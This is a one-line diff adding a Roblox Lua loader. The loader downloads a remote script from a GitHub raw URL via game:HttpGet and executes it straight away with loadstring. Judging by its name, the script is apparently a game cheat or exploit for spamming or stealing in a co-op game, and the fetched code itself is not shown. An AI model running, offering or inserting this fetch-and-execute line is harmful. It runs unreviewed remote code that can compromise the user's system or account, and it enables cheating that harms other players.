@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/plant-steal-co-op-spam5-cyb4m0ibodnm24.lua"))()
